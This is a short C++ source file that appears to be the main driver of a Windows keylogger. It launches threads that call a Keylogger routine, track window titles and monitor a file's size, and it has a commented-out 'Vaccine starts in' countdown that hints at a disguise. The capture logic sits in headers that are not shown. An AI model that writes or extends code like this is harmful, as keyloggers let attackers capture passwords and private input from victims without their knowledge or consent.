#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
#include "winmanager.h"
#include "KeyLogger.h"

void console();

int main()
{
    auto main = []() {
        printf("Running... \n");
        Keylogger(NULL);
    };
    auto window = []() {
        wintitle();
    };
    auto filesize = []() {
        FSD();
    };
    HMODULE hModule = GetModuleHandle(nullptr);
    if (hModule != nullptr) {
        console();
        thread t1 = thread(main);
        thread t2 = thread(window);
        thread t3 = thread(filesize);
        t1.join();
        t2.join();
        t3.join();
    }
}

void console() {
   /* printf("\033[1;32m");
    Sleep(500);
    printf("Vaccine starts in..\n");
    Sleep(1000);
    printf("3..\n");
    Sleep(1000);
    printf("2..\n");
    Sleep(1000);
    printf("1..\n");
    Sleep(1000);*/
}